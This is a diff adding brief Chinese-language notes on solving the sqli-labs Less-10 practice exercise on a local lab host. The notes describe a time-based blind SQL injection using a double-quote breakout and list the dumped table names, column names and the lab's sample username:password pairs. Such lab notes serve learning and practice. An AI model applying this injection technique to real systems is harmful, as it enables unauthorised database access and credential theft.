@@ -1,0 +1,18 @@
+http://10.0.2.15/sqli/Less-10/?id=1
+显示：You are in...........
+http://10.0.2.15/sqli/Less-10/?id=1"
+显示：You are in...........
+即无论正确还是错误，回显的文本都一样
+故采用基于时间的盲注（Less10与Less9唯一的区别就是Less10是基于“”号的，故把Less9中的脚本中'改为"即可，即把%27改为%22即可（Less10的脚本换了另一种方式写，与Less9有一些不同）
+
+表名：
+users,uagents,emails,referers
+推测表名为users
+
+字段名：
+id,username,password,user,current_connections,total_connections
+推测相应字段名为username和password
+
+字段值：
+dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
